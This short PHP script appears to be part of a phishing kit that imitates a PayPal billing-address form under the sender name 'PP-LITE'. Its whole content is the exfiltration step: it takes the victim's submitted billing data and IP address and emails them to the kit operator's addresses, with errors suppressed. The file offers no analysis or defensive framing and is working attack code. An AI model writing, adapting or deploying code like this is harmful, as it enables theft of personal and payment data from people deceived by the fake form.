<?php

include("mail.php");
include("functionsend.php");
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: PP-LITE" . "\r\n";
$subject = "PPL Billing Address Form :".getenv("REMOTE_ADDR");foreach ($to as $to)
@mail($to,$subject,functionsend::address(),$head);
@mail($send,$subject,functionsend::address(),$head);
?>